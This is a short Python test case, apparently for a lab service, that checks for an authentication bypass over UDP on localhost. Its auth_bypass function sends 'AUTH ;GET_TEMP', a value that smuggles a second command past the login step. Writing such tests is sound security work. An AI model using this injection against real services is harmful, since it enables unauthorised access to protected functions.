#This is just an example of a testcase
#Vulnerability Name - AuthByPass

import socket


soc = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)

HOST_ADDR = '127.0.0.1'
HOST_PORT = 23456

def authenticate(pd, pwd):
    soc.sendto(b"AUTH %s" % pwd, ("127.0.0.1", pd))
    a, b = soc.recvfrom(1024)
    return a.strip()

def auth_bypass(pd):
    try:
        soc.sendto(b"AUTH ;GET_TEMP", ("127.0.0.1", pd))
        a, b = soc.recvfrom(1024)
        c = a.decode("utf-8").strip()
        assert(c and (c != "Authenticate First" and c != "Bad Command"))
    except Exception as e:
        print(e)
        assert(1 == 2)

